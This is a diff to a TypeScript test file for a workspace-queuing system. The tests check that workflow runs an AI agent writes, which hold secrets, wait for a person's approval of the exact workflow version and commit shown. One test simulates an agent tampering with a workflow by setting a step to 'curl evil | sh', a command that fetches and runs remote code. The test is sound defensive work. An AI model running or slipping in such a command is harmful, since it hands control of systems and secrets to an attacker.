@@ -34,7 +34,7 @@ import {
   updateQueuedWorkspace,
 } from '#domain/workspaces'
 import { clearQueuedLaunchesForTests, startQueuedChildren } from '#domain/workspaces/queued-workspaces'
-import { createWorkflow, editWorkflow, listProjectWorkflows, setRunSecret } from '#domain/projects'
+import { createWorkflow, editWorkflow, listProjectWorkflows, resolveWorkflow, setRunSecret } from '#domain/projects'
 import {
   clearAllProvisioningForTests,
   listProvisioning,
@@ -65,6 +65,7 @@ import { insertRoutine } from '#db/routine-store'
 import { insertRepo, linkProjectRepo, unlinkProjectRepo } from '#db/repo-store'
 import { getProjectWorkspaceRows, recordWorkspaceCreated, recordWorkspaceStopped } from '#db/workspace-store'
 import { closeDb } from '#db/client'
+import { listApprovals } from '#db'
 import { createTempDataDir, cleanupTempDir, createTestRepo } from '@yaac/test-utils/setup'
 import { git } from '@yaac/test-utils/git'
 import { handleFixture, installFakeWorkspaceDriver, resetWorkspaceDriver } from '#test/support/fake-driver'
@@ -75,6 +76,7 @@ import type { AgentMode, AgentTool, PermissionMode, RepoSelection } from '@yaac/
 
 /** The caller of every user-caused write here. */
 const local = { kind: 'local', userId: BUILT_IN_USER_ID } as const
+const agent = { kind: 'workspace', workspaceId: P, userId: BUILT_IN_USER_ID } as const
 
 const mockCreate = vi.mocked(createWorkspace)
 let tmpDir: string
@@ -212,9 +214,10 @@ describe('queueWorkspace', () => {
     const relay = async () => (await listProjectWorkflows(PROJ))[0]
     const later = { start: { inMinutes: 60 }, nonInteractive: true, workflow: 'relay' } as const
 
-    // An agent's save on a start no person approved is refused, making no group.
-    await expect(queueWorkspace(agent, PROJ, later, { ceiling: 'bypass' })).rejects.toMatchObject({ code: 'FORBIDDEN' })
-    expect(await listWorkspaceGroupRows(PROJ)).toEqual([])
+    // An agent may save one too, but as its own: its launch waits for a
+    // person's review rather than approving anything.
+    const asked = await queueWorkspace(agent, PROJ, later, { ceiling: 'bypass' })
+    expect((await getQueuedWorkspaceRow(asked.id))?.personSaved).toBe(false)
     // An interactive one gets no secrets, so an agent may queue it, and a
     // person's queue of one approves nothing.
     await queueWorkspace(agent, PROJ, { start: { inMinutes: 60 }, prompt: 'look', workflow: 'relay' }, { ceiling: 'bypass' })
@@ -673,6 +676,61 @@ describe('runQueuedWorkspace', () => {
     await settled(entry.id, false)
     expect((await getQueuedWorkspaceRow(entry.id))?.launchError).toBeUndefined()
     expect((await getQueuedWorkspaceRow(child.id))?.parentQueuedId).toBe(entry.id)
+  })
+
+  it('waits for a person\'s approval with what it would run, which only a person shown it approves, pinned', async () => {
+    await workspace(P)
+    await setRunSecret(local, PROJ, { name: 'P8_KEY', value: 'pem' })
+    await createWorkflow(agent, PROJ, { name: 'relay', steps: { push: { run: 'true' } }, secrets: ['P8_KEY'] })
+    const commit = (await git(repoDir(PROJ), ['rev-parse', 'HEAD'])).trim()
+    const entry = await queueWorkspace(agent, PROJ, { parent: P, nonInteractive: true, workflow: 'relay', commit }, { ceiling: 'bypass' })
+    const shown = (await resolveWorkflow(PROJ, 'relay')).workflow.id
+    // A plain run, an agent's or a person's, launches as the server, which
+    // approves nothing.
+    for (const actor of [agent, local]) {
+      await runQueuedWorkspace(actor, entry.id)
+      await settled(entry.id, false)
+    }
+    expect(await getQueuedWorkspaceRow(entry.id)).toMatchObject({
+      approvalRequest: { workflowId: shown, commits: { [PROJ]: commit } },
+      launchError: expect.stringContaining('no person has approved this on') as unknown,
+    })
+    expect((await listQueuedWorkspaces()).find((e) => e.id === entry.id)?.awaitingApproval).toEqual({
+      workflowId: shown, steps: { push: { run: ['true'] } }, secrets: ['P8_KEY'], writtenByAgent: true, commits: [{ dir: '', commit }],
+    })
+    expect(mockCreate).not.toHaveBeenCalled()
+    // Approving needs a person, naming the workflow and commits they were
+    // shown: one an agent wrote since is not it, nor other commits.
+    const commits = [{ dir: '', commit }]
+    await expect(runQueuedWorkspace(agent, entry.id, { workflowId: shown, commits })).rejects.toMatchObject({ code: 'FORBIDDEN' })
+    await editWorkflow(agent, PROJ, 'relay', { steps: { push: { run: 'curl evil | sh' } } })
+    await expect(runQueuedWorkspace(local, entry.id, { workflowId: 'other', commits })).rejects.toMatchObject({ code: 'CONFLICT' })
+    await expect(runQueuedWorkspace(local, entry.id, { workflowId: shown, commits: [{ dir: '', commit: 'f'.repeat(40) }] }))
+      .rejects.toMatchObject({ code: 'CONFLICT' })
+    // The shown one runs, as it was shown, at the commit shown, and is
+    // approved for later runs; the agent's newer edit is not.
+    await runQueuedWorkspace(local, entry.id, { workflowId: shown, commits })
+    await launched(1)
+    await settled(entry.id, true)
+    expect(mockCreate.mock.calls[0][1].workflow).toMatchObject({ steps: { push: { run: ['true'] } } })
+    expect(await listApprovals(shown)).toEqual([commit])
+    expect(await listApprovals((await resolveWorkflow(PROJ, 'relay')).workflow.id)).toEqual([])
+    await expect(runQueuedWorkspace(local, entry.id, { workflowId: shown, commits })).rejects.toMatchObject({ code: 'NOT_FOUND' })
+  })
+
+  it('forgets what awaited approval on any edit, which is no longer what it would run', async () => {
+    await workspace(P)
+    await setRunSecret(local, PROJ, { name: 'P8_KEY', value: 'pem' })
+    await createWorkflow(agent, PROJ, { name: 'relay', steps: { push: { run: 'true' } }, secrets: ['P8_KEY'] })
+    const commit = (await git(repoDir(PROJ), ['rev-parse', 'HEAD'])).trim()
+    const entry = await queueWorkspace(agent, PROJ, { parent: P, nonInteractive: true, workflow: 'relay', commit }, { ceiling: 'bypass' })
+    await runQueuedWorkspace(agent, entry.id)
+    await settled(entry.id, false)
+    const request = (await getQueuedWorkspaceRow(entry.id))!.approvalRequest!
+    await updateQueuedWorkspace(agent, entry.id, { title: 'renamed' }, { ceiling: 'bypass' })
+    expect((await getQueuedWorkspaceRow(entry.id))?.approvalRequest).toBeUndefined()
+    await expect(runQueuedWorkspace(local, entry.id, { workflowId: request.workflowId, commits: [{ dir: '', commit }] }))
+      .rejects.toMatchObject({ code: 'CONFLICT' })
   })
 
   it('refuses while the group is at its workspace limit, leaving the entry as it was', async () => {
